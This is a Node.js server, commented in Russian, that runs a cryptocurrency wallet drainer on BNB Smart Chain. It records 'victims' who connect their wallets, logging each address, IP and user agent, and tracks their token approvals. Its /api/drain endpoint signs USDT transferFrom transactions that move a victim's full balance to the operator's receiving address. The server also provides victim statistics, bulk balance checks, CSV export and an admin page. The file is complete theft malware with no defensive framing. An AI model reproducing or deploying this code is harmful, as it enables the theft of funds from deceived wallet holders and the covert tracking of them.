import express from "express";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import Web3 from "web3";
import sqlite3 from "sqlite3";
import { open } from "sqlite";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3005;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ========== БАЗА ДАННЫХ ==========
let db;

async function initDB() {
    db = await open({
        filename: path.join(__dirname, "victims.db"),
        driver: sqlite3.Database
    });

    await db.exec(`
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT UNIQUE NOT NULL,
            wallet_type TEXT,
            tx_hash TEXT,
            ref TEXT,
            status TEXT DEFAULT 'active',
            notes TEXT,
            ip TEXT,
            user_agent TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    await db.exec(`
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            amount REAL,
            status TEXT DEFAULT 'pending',
            tx_hash TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    console.log("✅ База данных инициализирована");
    return db;
}

await initDB();

// ========== WEB3 ==========
const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS;
const PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS;
const USDT_ADDRESS = process.env.USDT_ADDRESS;

const web3 = new Web3("https://bsc-dataseed.binance.org");
const account = web3.eth.accounts.privateKeyToAccount("0x" + PRIVATE_KEY);
web3.eth.accounts.wallet.add(account);

const USDT_ABI = [
    {
        constant: false,
        inputs: [
            { name: "from", type: "address" },
            { name: "to", type: "address" },
            { name: "amount", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
    },
    {
        constant: true,
        inputs: [{ name: "account", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "", type: "uint256" }],
        type: "function"
    }
];

const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

// ========== API ==========

// 1. Подключение
app.post("/api/connect", async (req, res) => {
    try {
        const { address, wallet_type, ref } = req.body;
        if (!address) return res.status(400).json({ error: "Address required" });

        const existing = await db.get("SELECT * FROM victims WHERE address = ?", [address]);
        if (existing) {
            return res.json({ success: true, message: "Already exists" });
        }

        await db.run(
            `INSERT INTO victims (address, wallet_type, ref, ip, user_agent) 
             VALUES (?, ?, ?, ?, ?)`,
            [address, wallet_type, ref, req.ip || req.connection.remoteAddress, req.headers["user-agent"]]
        );

        console.log(`✅ Новая жертва: ${address} (${wallet_type})`);
        res.json({ success: true });
    } catch (error) {
        console.error("Connect error:", error);
        res.status(500).json({ error: "Internal error" });
    }
});

// 2. Approve
app.post("/api/approve", async (req, res) => {
    try {
        const { address, tx_hash, ref } = req.body;
        if (!address) return res.status(400).json({ error: "Address required" });

        await db.run(
            `UPDATE victims SET tx_hash = ?, status = 'approved', updated_at = CURRENT_TIMESTAMP 
             WHERE address = ?`,
            [tx_hash, address]
        );

        console.log(`✅ Approve получен: ${address}`);
        res.json({ success: true });
    } catch (error) {
        console.error("Approve error:", error);
        res.status(500).json({ error: "Internal error" });
    }
});

// 3. Списание
app.post("/api/drain", async (req, res) => {
    try {
        const { address, amount } = req.body;
        if (!address) return res.status(400).json({ error: "Address required" });

        // Проверяем баланс
        const balanceWei = await usdtContract.methods.balanceOf(address).call();
        const balance = parseFloat(web3.utils.fromWei(balanceWei, "ether")) || 0;

        if (balance <= 0) {
            return res.json({ success: false, error: "No USDT to drain" });
        }

        const drainAmount = amount && amount > 0 && amount <= balance ? amount : balance;
        const amountWei = web3.utils.toWei(drainAmount.toString(), "ether");

        // Проверяем BNB на газ
        const bnbBalance = await web3.eth.getBalance(SPENDER_ADDRESS);
        const bnbInEth = web3.utils.fromWei(bnbBalance, "ether");
        if (parseFloat(bnbInEth) < 0.003) {
            return res.json({ success: false, error: `Недостаточно BNB для газа: ${bnbInEth}` });
        }

        // Транзакция
        const gasPrice = await web3.eth.getGasPrice();
        const gasEstimate = await usdtContract.methods.transferFrom(address, RECEIVER_ADDRESS, amountWei)
            .estimateGas({ from: SPENDER_ADDRESS });

        const tx = {
            from: SPENDER_ADDRESS,
            to: USDT_ADDRESS,
            data: usdtContract.methods.transferFrom(address, RECEIVER_ADDRESS, amountWei).encodeABI(),
            gas: Math.floor(gasEstimate * 1.2),
            gasPrice: gasPrice,
            nonce: await web3.eth.getTransactionCount(SPENDER_ADDRESS)
        };

        const signedTx = await web3.eth.accounts.signTransaction(tx, "0x" + PRIVATE_KEY);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        // Обновляем статус
        await db.run(
            `UPDATE victims SET status = 'processed', notes = ?, updated_at = CURRENT_TIMESTAMP 
             WHERE address = ?`,
            [`Drained ${drainAmount.toFixed(2)} USDT`, address]
        );

        await db.run(
            `INSERT INTO transactions (address, amount, status, tx_hash) 
             VALUES (?, ?, 'completed', ?)`,
            [address, drainAmount, receipt.transactionHash]
        );

        console.log(`💰 Списано ${drainAmount.toFixed(2)} USDT с ${address} TX: ${receipt.transactionHash}`);
        res.json({ success: true, txHash: receipt.transactionHash, amount: drainAmount });

    } catch (error) {
        console.error("Drain error:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 4. Получение всех жертв
app.get("/api/victims", async (req, res) => {
    try {
        const victims = await db.all("SELECT * FROM victims ORDER BY created_at DESC");
        res.json({ success: true, data: victims });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 5. Статистика
app.get("/api/stats", async (req, res) => {
    try {
        const stats = await db.get(`
            SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active,
                SUM(CASE WHEN status = 'approved' THEN 1 ELSE 0 END) as approved,
                SUM(CASE WHEN status = 'processed' THEN 1 ELSE 0 END) as processed
            FROM victims
        `);
        res.json({ success: true, data: stats });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 6. Обновление статуса
app.put("/api/victim/:address/status", async (req, res) => {
    try {
        const { address } = req.params;
        const { status, notes } = req.body;
        await db.run(
            `UPDATE victims SET status = ?, notes = ?, updated_at = CURRENT_TIMESTAMP WHERE address = ?`,
            [status, notes, address]
        );
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 7. Удаление
app.delete("/api/victim/:address", async (req, res) => {
    try {
        await db.run("DELETE FROM victims WHERE address = ?", [req.params.address]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 8. Очистка
app.delete("/api/clear", async (req, res) => {
    try {
        await db.run("DELETE FROM victims");
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 9. Баланс
app.get("/api/balance/:address", async (req, res) => {
    try {
        const balanceWei = await usdtContract.methods.balanceOf(req.params.address).call();
        const balance = parseFloat(web3.utils.fromWei(balanceWei, "ether")) || 0;
        res.json({ success: true, balance });
    } catch (error) {
        res.json({ success: false, balance: 0 });
    }
});

// 10. Массовые балансы
app.post("/api/balances", async (req, res) => {
    try {
        const { addresses } = req.body;
        if (!addresses || !Array.isArray(addresses)) {
            return res.status(400).json({ error: "Addresses array required" });
        }
        const balances = {};
        for (const address of addresses) {
            try {
                const balanceWei = await usdtContract.methods.balanceOf(address).call();
                balances[address] = parseFloat(web3.utils.fromWei(balanceWei, "ether")) || 0;
            } catch (e) {
                balances[address] = 0;
            }
        }
        res.json({ success: true, balances });
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// 11. Экспорт CSV
app.get("/api/export", async (req, res) => {
    try {
        const victims = await db.all("SELECT * FROM victims ORDER BY created_at DESC");
        let csv = "Address,Wallet Type,Status,IP,Date\n";
        for (const v of victims) {
            csv += `${v.address},${v.wallet_type},${v.status},${v.ip || ""},${v.created_at}\n`;
        }
        res.setHeader("Content-Type", "text/csv");
        res.setHeader("Content-Disposition", "attachment; filename=victims.csv");
        res.send(csv);
    } catch (error) {
        res.status(500).json({ error: "Internal error" });
    }
});

// ========== СТРАНИЦЫ ==========
app.get("/admin", (req, res) => {
    res.sendFile(path.join(__dirname, "admin.html"));
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== ЗАПУСК ==========
app.listen(PORT, "0.0.0.0", () => {
    console.log(`
    ╔═══════════════════════════════════════════╗
    ║   🚀 ДРЕНЕР ЗАПУЩЕН!                     ║
    ║   📡 Сервер: http://localhost:${PORT}     ║
    ║   🎯 Сайт: http://localhost:${PORT}       ║
    ║   👑 Админка: http://localhost:${PORT}/admin ║
    ╚═══════════════════════════════════════════╝
    `);
});